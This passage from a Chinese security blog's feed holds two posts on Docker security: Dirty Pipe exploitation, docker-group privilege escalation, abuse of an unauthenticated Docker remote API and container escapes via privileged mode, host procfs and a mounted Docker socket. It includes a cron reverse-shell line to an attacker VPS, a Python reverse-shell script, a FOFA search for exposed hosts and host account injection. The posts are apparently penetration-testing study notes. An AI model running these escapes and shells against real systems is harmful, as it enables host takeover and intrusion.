href="https://github.com/Al1ex/CVE-2022-0847">https://github.com/Al1ex/CVE-2022-0847</a><br>两种利用方式：一种是修改&#x2F;覆盖只读文件提权，另一种是劫持 SUID 二进制文件提权<br>第一种我失败了，应该是内核版本的问题</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_10-50.png" class="" title="2024-02-17_10-50.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>第二种以 root 身份运行的只读 SUID 进程内存中注入和覆盖数据</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_10-48.png" class="" title="2024-02-17_10-48.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><h3 id="利用条件与限制"><a href="#利用条件与限制" class="headerlink" title="利用条件与限制"></a>利用条件与限制</h3><p>利用条件：<br>1、有可读权限或者可以传回文件的文件描述符。<br>2、有漏洞的内核</p><p>利用的限制：<br>1、第一个字节不可修改，并且单次写入不能大于 4k<br>2、只能单纯覆盖，不能调整文件大小<br>3、由于漏洞基于内存页，所以不会对磁盘有影响</p><h3 id="与Docker的关系"><a href="#与Docker的关系" class="headerlink" title="与Docker的关系"></a>与Docker的关系</h3><p>由于 Docker 和宿主机是共享内核，尽管与其他进程资源是隔离开的，内核漏洞也很可能会对 Docker 容器造成安全问题<br>对于容器的影响：<br>假设我们有两个容器：liu1和liu2，由于 Docker 本质上是由一组互相重叠的层所组层的，然后容器引擎将其合并到一起，原本这些层都是只读的，但由于脏管道漏洞的影响，我们可以在 liu1 容器里修改 &#x2F;etc&#x2F;passwd 使得 liu2 容器的 &#x2F;etc&#x2F;passwd 被修改</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_11-13.png" class="" title="2024-02-17_11-13.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><h2 id="docker用户组提权"><a href="#docker用户组提权" class="headerlink" title="docker用户组提权"></a>docker用户组提权</h2><p>Docker 需要 root 权限才能跑起来,其运行的所有命令都是需要 sudo 来运行，因此 Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，这就如同拥有 root 的访问权限。简而言之,如果我们拿到了一个docker组内用户的权限,就可以提升到root权限</p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>如果一个服务器有一个普通的用户，并且这个用户加入了 docker 组，则这个用户已经是 root 了<br>方法一：<br>环境搭建</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">adduser </span><span class="hljs-keyword">joker</span><br><span class="hljs-keyword"></span>usermod -G docker <span class="hljs-keyword">joker</span><br><span class="hljs-keyword"></span>newgrp docker<br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-03.png" class="" title="2024-02-17_15-03.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>默认情况下，Docker 软件包是会默认添加一个 docker 用户组的，Docker 守护进程会允许 root 用户和 docker组用户访问 Docker，给用户提供 Docker 权限就相当于给用户无需认证便可以随便获取的 root 权限</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -v /:/hostOS -i -t chrisfosterelli/rootplease</span><br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-04.png" class="" title="2024-02-17_15-04.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>参数 -v 将容器外部的目录 &#x2F; 挂载到容器内部 &#x2F;hostOS，然后获取到宿主机的 root 权限</p><p>方法二：<br>环境搭建</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">adduser <span class="hljs-keyword">test</span>-docker<br>usermod -G docker <span class="hljs-keyword">test</span>-docker<br>newgrp docker<br></code></pre></td></tr></table></figure><p>将 &#x2F;etc&#x2F; 目录挂载进 Docker，查看 shadow 和 passwd</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-13.png" class="" title="2024-02-17_15-13.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>这里已经获取到密码 hash，我们添加一个特权账号</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> passwd -<span class="hljs-number">1</span> -salt test-d<br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-16.png" class="" title="2024-02-17_15-16.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-20.png" class="" title="2024-02-17_15-20.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><h2 id="docker远程API未授权访问逃逸"><a href="#docker远程API未授权访问逃逸" class="headerlink" title="docker远程API未授权访问逃逸"></a>docker远程API未授权访问逃逸</h2><p>Docker的2375端口主要用于Docker守护进程的监听和通信。它主要用于Docker容器的网络连接和通信，包括容器的启动、停止、删除等操作。该端口可以被Docker守护进程用于接收来自客户端的请求，并与其进行交互和通信，在早期的版本安装Docker是会默认将2375端口对外开放,目前改为默认只允许本地访问。而docker远程API未授权访问漏洞原理就是：docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker</p><p>如何开启远程访问（环境搭建）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">第一种：<br>vim <span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>docker.service<br><br>ExecStart=<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/dockerd -H fd:/</span><span class="hljs-regexp">/ -H tcp:/</span>/<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span><br>--containerd=<span class="hljs-regexp">/run/</span>containerd/containerd.sock<br><br>第二种：<br>dockerd -H unix:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>run/docker.sock -H <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span><br></code></pre></td></tr></table></figure><p>如何检测2375端口存在未授权?<br>可以直接在浏览器访问敏感接口</p><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_16-33.png" class="" title="2024-02-17_16-33.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>或者通过下面这条指令，如果返回404，说明存在</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">IP</span>=`hostname -i | awk -F. &#x27;&#123;print $<span class="hljs-number">1</span> <span class="hljs-string">&quot;.&quot;</span> $<span class="hljs-number">2</span> <span class="hljs-string">&quot;.&quot;</span> $<span class="hljs-number">3</span> <span class="hljs-string">&quot;.1&quot;</span>&#125;&#x27; ` &amp;&amp; wget http://$IP:<span class="hljs-number">2375</span><br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_15-42.png" class="" title="2024-02-17_15-42.png"><h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>fofa语法索引</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">port</span>=<span class="hljs-string">&quot;2375&quot;</span> &amp;&amp; country=<span class="hljs-string">&quot;CN&quot;</span> &amp;&amp; <span class="hljs-string">&quot;Docker&quot;</span> //country自改<br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-18_14-32.png" class="" title="2024-02-18_14-32.png"><h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span>&lt;target&gt;:<span class="hljs-number">2375</span><span class="hljs-regexp">/containers/</span>json  <span class="hljs-regexp">//</span>列出容器信息<br><br>docker -H tcp:<span class="hljs-regexp">//</span>&lt;target&gt;:<span class="hljs-number">2375</span> ps -a  <span class="hljs-regexp">//</span>查看容器<br><br>docker -H tcp:<span class="hljs-regexp">//</span>&lt;target&gt;:<span class="hljs-number">2375</span> run -it -v <span class="hljs-regexp">/:/m</span>nt nginx:latest <span class="hljs-regexp">/bin/</span>bash   <span class="hljs-regexp">//</span>新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下<br><br>echo <span class="hljs-string">&#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/VPSip/监听端口 0&gt;&amp;1&#x27;</span> &gt;&gt; <span class="hljs-regexp">/mnt/</span>var<span class="hljs-regexp">/spool/</span>cron<span class="hljs-regexp">/crontabs/</span>root  <span class="hljs-regexp">//</span>在容器内执行命令，将反弹shell的脚本写入到<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>root<br><br>本地监听端口，获取对方宿主机shell<br><br></code></pre></td></tr></table></figure><img src="/2024/02/18/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89/2024-02-17_23-00.png" class="" title="2024-02-17_23-00.png">]]></content>
    
    
    <categories>
      
      <category>云原生安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker安全（一）</title>
    <link href="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="Docker介绍"><a href="#Docker介绍" class="headerlink" title="Docker介绍"></a>Docker介绍</h2><p>Docker是一种轻量级的虚拟化技术，同时是一个开源的应用容器运行环境搭建平台，可以让开发者以便捷方式打包应用到一个可移植的容器中，然后安装至任何运行Linux或Windows等系统的服务器上。相较于传统虚拟机，Docker容器提供轻量化的虚拟化方式、安装便捷、启停速度快</p><p>Docker容器具有以下三大特点：<br>轻量化：一台主机上运行的多个Docker容器可以共享主机操作系统内核；启动迅速，只需占用很少的计算和内存资源<br>标准开放：Docker容器基于开放式标准，能够在所有主流Linux版本、Microsoft Windows以及包括VM、裸机服务器和云在内的任何基础设施上运行<br>安全可靠：Docker赋予应用的隔离性不仅限于彼此隔离，还独立于底层的基础设施。Docker默认提供最强的隔离，因此应用出现问题，也只是单个容器的问题，而不会波及到整台主机</p><p>Docker容器的运行逻辑如下图所示，Docker使用客户端&#x2F;服务器 (C&#x2F;S) 架构模式，Docker守护进程（Docker daemon）作为Server端接收Docker客户端的请求，并负责创建、运行和分发Docker容器。Docker守护进程一般在Docker主机后台运行，用户使用Docker客户端直接跟Docker守护进程进行信息交互</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/download.png" class="" title="download.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h2 id="Docker安全机制"><a href="#Docker安全机制" class="headerlink" title="Docker安全机制"></a>Docker安全机制</h2><p>提到Docker安全，就不得不说以下名词：</p><p>Namespace–&gt;内核命名空间<br>Linux的namespace是一种内核特性，可以将系统资源进行隔离，每个隔离的部分被称为一个namespace。通过使用namespace，可以将不同进程之间的资源进行隔离，使得它们感觉像是在独立的环境中运行。用简洁明了的话来说,namespace实现了容器与容器,容器与宿主机之间的隔离，而业内广为人知的privileged特权逃逸的本质也是因为特权环境打破了容器与宿主机直接的隔离实现了容器逃逸</p><p>Cgroups–&gt;控制组<br>Cgroups本质上是在内核中附加的一系列钩子（hook），当程序运行时，内核会根据程序对资源的请求触发相应的钩子，以达到资源追踪和限制的目的。在Linux系统中，Cgroups对于系统资源的管理和控制非常重要，可以帮助管理员更加精细化地控制资源的分配和使用，Cgroups主要实现了对容器资源的分配,限制和管理</p><p>Capabilities<br>Capabilities是Linux一种安全机制,在linux内核2.2之后引入,用于对权限更细致的控制</p><p>参考文章：<br><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/Docker%E5%AE%B9%E5%99%A8.html">https://info.support.huawei.com/info-finder/encyclopedia/zh/Docker%E5%AE%B9%E5%99%A8.html</a><br><a href="https://www.hacking8.com/MiscSecNotes/23.html">https://www.hacking8.com/MiscSecNotes/23.html</a></p><h2 id="Docker常用渗透测试点"><a href="#Docker常用渗透测试点" class="headerlink" title="Docker常用渗透测试点"></a>Docker常用渗透测试点</h2><h3 id="前渗透——容器判断与信息收集"><a href="#前渗透——容器判断与信息收集" class="headerlink" title="前渗透——容器判断与信息收集"></a>前渗透——容器判断与信息收集</h3><p>当我们拿到了一个shell,首先要判断的是当前环境是否为容器环境，我们可以通过以下方式进行判断</p><p>1、查询cgroup信息<br>当在容器中运行进程时，每个进程会被分配到一个或多个 cgroup 中，cgroup 可以对进程的资源使用进行控制和限制，而&#x2F;proc&#x2F;1&#x2F;cgroup文件记录了进程的控制组信息</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-20.png" class="" title="2024-02-12_21-20.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>通过上图可知，我们通过判断cat &#x2F;proc&#x2F;1&#x2F;cgroup的输出内容是否有docker来判断是否是容器内的环境，所以我们可以稍微修改一下上述查询的语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/1/cgroup | grep -qi docker &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;In Docker&quot;</span> || <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not Docker&quot;</span><br></code></pre></td></tr></table></figure><p>2、查看硬盘信息<br>容器输出为空，非容器有内容输出。值得注意的是:Privileged 特权模式下也是可以查看到内容的</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fdisk -l</span><br></code></pre></td></tr></table></figure><p>容器内环境:</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23.png" class="" title="2024-02-12_21-23.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>3、查询.dockerenv文件<br>.dockerenv文件是Docker守护进程的配置文件，它包含了Docker守护进程的运行参数和配置信息。这个文件通常用于配置Docker守护进程的行为，例如容器的网络设置、存储驱动、卷管理等。.dockerenv文件是一个文本文件，其中包含了一些环境变量，这些环境变量描述了Docker守护进程的状态和配置。这个文件通常由Docker守护进程的配置脚本生成，并保存在Docker守护进程的数据目录中。简单来说只有在docker环境下才有这个文件，所以可以通过检查是否有.dockerenv文件，来进行判断是否在docker环境中</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">ls</span> -alh / |grep <span class="hljs-string">.dockerenv</span><br></code></pre></td></tr></table></figure><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-23_1.png" class="" title="2024-02-12_21-23_1.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>4、检查mount信息+挂载点</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-12_21-27.png" class="" title="2024-02-12_21-27.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><h3 id="后渗透-常见docker逃逸"><a href="#后渗透-常见docker逃逸" class="headerlink" title="后渗透-常见docker逃逸"></a>后渗透-常见docker逃逸</h3><p>容器逃逸的实质是从Cgroup&#x2F;Namespace 限制权限的进程获取更多权限，常见的docker逃逸方式：<br>1、Priviliged 特权模式逃逸<br>2、挂载宿主机 procfs 逃逸<br>3、挂载 Docker Socket 逃逸</p><p>为了方便演示，在根目录下面创建一个flag.txt，如果在创建的镜像当中看到这个flag，证明逃逸成功</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-49.png" class="" title="2024-02-13_14-49.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><h4 id="Priviliged-特权模式逃逸"><a href="#Priviliged-特权模式逃逸" class="headerlink" title="Priviliged 特权模式逃逸"></a>Priviliged 特权模式逃逸</h4><p>如何判断当前容器是以Privileged 特权模式启动的呢?</p><p>这里提供两种方式：<br>1、我们可以使用 fdisk -l 查看宿主机的磁盘设备，如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的<br>2、除此之外我们可以通过查看CapEff的掩码值来判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57.png" class="" title="2024-02-13_14-57.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>尝试使用文件挂载进行逃逸，然后我们再通过 cat 去查看被挂载的文件夹，如果可以成功看到宿主机的内容，说明逃逸成功</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_14-57_1.png" class="" title="2024-02-13_14-57_1.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>从对抗的层面上，不建议将逃逸的行为当成可以写入宿主机特定文件 (如 &#x2F;etc&#x2F;cron*, &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 等文件) 的行为，应该根据目标选择更趋近与业务行为的手法</p><h4 id="挂载宿主机-procfs-逃逸"><a href="#挂载宿主机-procfs-逃逸" class="headerlink" title="挂载宿主机 procfs 逃逸"></a>挂载宿主机 procfs 逃逸</h4><p>挂载宿主机 procfs 逃逸,其本质上因为宿主机挂载了procfs,导致我们可以像宿主机内写入一段恶意的payload,比如反弹shell,然后利用代码制造崩溃,触发内存转储,就会执行我们恶意的payload</p><p>Procfs 是进程文件系统的缩写，包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。linux这个文件系统通常被挂载到 &#x2F;proc 目录。由于 &#x2F;proc 不是一个真正的文件系统，它也就不占用存储空间，只是占用有限的内存。&#x2F;proc中的文件可以被修改，但一般不可以被删除</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/561614e85933b4d01a5dbf10d2715922.png" class="" title="561614e85933b4d01a5dbf10d2715922.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>如果返回了两个 core_pattern 文件，那么很可能就是挂载了宿主机的 procfs</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name core_pattern<br></code></pre></td></tr></table></figure><p>core_pattern（核心转储模式）是Linux系统中的一个配置参数，用于定义在程序崩溃时生成核心转储文件的方式和位置。当一个程序发生崩溃（如段错误）时，操作系统会生成一个包含程序崩溃状态的核心转储文件，以便进行调试和故障排除</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-18.png" class="" title="2024-02-13_15-18.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>接下来我们需要找到docker在当前宿主机的绝对路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/mounts | xargs -d <span class="hljs-string">&#x27;,&#x27;</span> -n 1 | grep workdir<br></code></pre></td></tr></table></figure><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-19.png" class="" title="2024-02-13_15-19.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>可以看出,当前的绝对路径为：&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;*****************&#x2F;merged（去除work换成merged）<br>接下来我们需要准备一个反弹shell的脚本以及一个可以制造崩溃,触发内存转储的代码<br>反弹shell脚本：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">#!/usr/bin/python3<br><span class="hljs-keyword">import</span>  <span class="hljs-built_in">os</span><br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>lhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>lport = <span class="hljs-number">0000</span><br>def main():<br>   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   s.connect((lhost, lport))<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>   <span class="hljs-built_in">os</span>.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>   <span class="hljs-built_in">os</span>.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>   pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>   # <span class="hljs-built_in">os</span>.remove(<span class="hljs-string">&#x27;/tmp/.liuty.py&#x27;</span>)<br>   s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main()<br></code></pre></td></tr></table></figure><p>（注意：如果vim被禁用或者因为别的原因用不了，可以用cat+EOF代替）</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-53.png" class="" title="2024-02-13_16-53.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>接下来赋权并且将该脚本写到目标的 proc 目录下</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_16-58_1.png" class="" title="2024-02-13_16-58_1.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>然后我们用c写一个可以触发崩溃的程序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>  </span>&#123;<br>   <span class="hljs-type">int</span> *a  = <span class="hljs-literal">NULL</span>;<br>   *a = <span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>随后进行编译并赋权限，紧接着我们在攻击机上起监听，于此同时,我们在容器内运行编译好的程序</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_17-21.png" class="" title="2024-02-13_17-21.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>成功反弹shell,并拿到flag<br>逃逸Success!</p><h4 id="挂载-Docker-Socket-逃逸"><a href="#挂载-Docker-Socket-逃逸" class="headerlink" title="挂载 Docker Socket 逃逸"></a>挂载 Docker Socket 逃逸</h4><p>Docker Socket 是Docker引擎的UNIX套接字文件，用于与Docker守护进程进行通信。Docker守护进程是Docker引擎的核心组件，负责管理和执行容器。Docker Socket允许用户通过基于RESTful API的请求与Docker守护进程进行通信，以便执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等</p><p>判断当前容器是否挂载Docker Socket,如果存在文件则说明Docker Socket被挂载,就可以尝试逃逸</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-00.png" class="" title="2024-02-13_15-00.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>我们可以在容器内部创建一个新的容器，因为Docker Socket被挂载到了当前容器,所有我们可以将宿主机目录挂载到新的容器内部</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br><br>apt-<span class="hljs-built_in">get</span> install curl<br><br>curl -fsSL https://<span class="hljs-built_in">get</span>.docker.<span class="hljs-keyword">com</span>/ | <span class="hljs-keyword">sh</span><br><br>apt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span> &amp;&amp; apt-<span class="hljs-built_in">get</span> install curl &amp;&amp; curl -fsSL https://<span class="hljs-built_in">get</span>.docker.<span class="hljs-keyword">com</span>/ | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-03.png" class="" title="2024-02-13_15-03.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-07.png" class="" title="2024-02-13_15-07.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>接下来，在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部即可</p><img src="/2024/02/13/Docker%E5%AE%89%E5%85%A8%EF%BC%88%E4%B8%80%EF%BC%89/2024-02-13_15-09.png" class="" title="2024-02-13_15-09.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>waiting……</p>]]></content>
    
    
    <categories>
      
      <category>云原生安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BehinderV4魔改</title>
    <link href="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/"/>
    <url>/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/</url>
    
